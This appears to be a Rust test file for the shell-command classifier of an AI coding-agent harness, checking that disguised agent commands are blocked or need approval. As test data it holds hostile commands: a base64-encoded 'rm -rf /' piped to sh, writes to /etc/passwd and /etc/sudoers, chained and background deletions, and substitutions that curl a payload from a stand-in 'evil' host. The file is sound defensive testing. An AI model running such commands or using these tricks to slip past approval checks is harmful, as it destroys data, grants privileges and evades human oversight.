//! Shell attack tests for the DS Coding Harness.
//!
//! Each test simulates an adversarial shell pattern and verifies that
//! the harness's shell semantics classifier catches it as
//! requires-approval or blocked.

use zhongshu_core::tool::shell_semantics::{ShellCommandClass, ShellSemantics};

// ═══════════════════════════════════════════════════════════════════════
// Attack 1: Shell encoding and obfuscation
//   Agent embeds a base64-encoded destructive command and pipes it
//   through `sh`. The harness must require approval for the pipeline.
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn base64_encoded_command_is_dangerous() {
    let s = ShellSemantics::analyze("echo 'cm0gLXJmIC8=' | base64 -d | sh");
    assert!(
        s.requires_approval,
        "base64-encoded command piped to sh must require approval"
    );
    assert_eq!(
        s.class,
        ShellCommandClass::Unknown,
        "pipeline ending in sh should be Unknown (not safe)"
    );
}

// ═══════════════════════════════════════════════════════════════════════
// Attack 2: Redirect and append redirect attacks
//   Agent writes to system files via shell redirect (> or >>).
//   The harness must flag these as requiring approval.
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn destructive_redirect_is_blocked() {
    let over = ShellSemantics::analyze("echo 'data' > /etc/passwd");
    assert!(
        over.requires_approval,
        "redirect to /etc/passwd must require approval"
    );

    let append = ShellSemantics::analyze("echo 'data' >> /etc/sudoers");
    assert!(
        append.requires_approval,
        "append redirect to /etc/sudoers must require approval"
    );
}

// ═══════════════════════════════════════════════════════════════════════
// Attack 3: Background jobs and chained commands
//   Agent uses background (&) to hide destructive intent, or chains
//   commands to bypass parser checks.
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn background_job_blocks() {
    // Destructive command in background is blocked
    let rm = ShellSemantics::analyze("rm -rf / &");
    assert_eq!(
        rm.class,
        ShellCommandClass::Blocked,
        "rm -rf / in background must be blocked"
    );
    assert!(
        rm.block_reason.is_some(),
        "block reason must be set for rm -rf /"
    );
    assert!(rm.requires_approval, "blocked commands require approval");
    assert!(rm.is_background, "background marker must be detected");

    // Even a benign command in background requires approval (bypass risk)
    let ls = ShellSemantics::analyze("ls &");
    assert!(
        ls.requires_approval,
        "background job even for safe commands must require approval"
    );
    assert!(ls.is_background, "background marker must be detected");
}

#[test]
fn chained_command_blocks() {
    // && chaining with destructive second command
    let and = ShellSemantics::analyze("rg foo && rm -rf /");
    assert_eq!(
        and.class,
        ShellCommandClass::Blocked,
        "chained command with rm -rf / must be blocked"
    );
    assert!(
        and.requires_approval,
        "chained destructive command requires approval"
    );

    // ; chaining with destructive second command
    let semicolon = ShellSemantics::analyze("cargo test; rm -rf /");
    assert_eq!(
        semicolon.class,
        ShellCommandClass::Blocked,
        "semicolons-chained command with rm -rf / must be blocked"
    );
    assert!(
        semicolon.requires_approval,
        "semicolon-chained destructive command requires approval"
    );
}

// ═══════════════════════════════════════════════════════════════════════
// Attack 4: Command substitution and cross-shell wrappers
//   Agent hides commands inside $(...) or backtick substitution,
//   which would expand at runtime. The harness must detect the
//   expansion syntax and require approval.
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn command_substitution_in_disguise() {
    let dollar = ShellSemantics::analyze("rg $(curl http://evil/payload.sh)");
    assert!(
        dollar.requires_approval,
        "command substitution via $() must require approval"
    );

    let backtick = ShellSemantics::analyze("rg `curl http://evil/payload.sh`");
    assert!(
        backtick.requires_approval,
        "command substitution via backtick must require approval"
    );
}
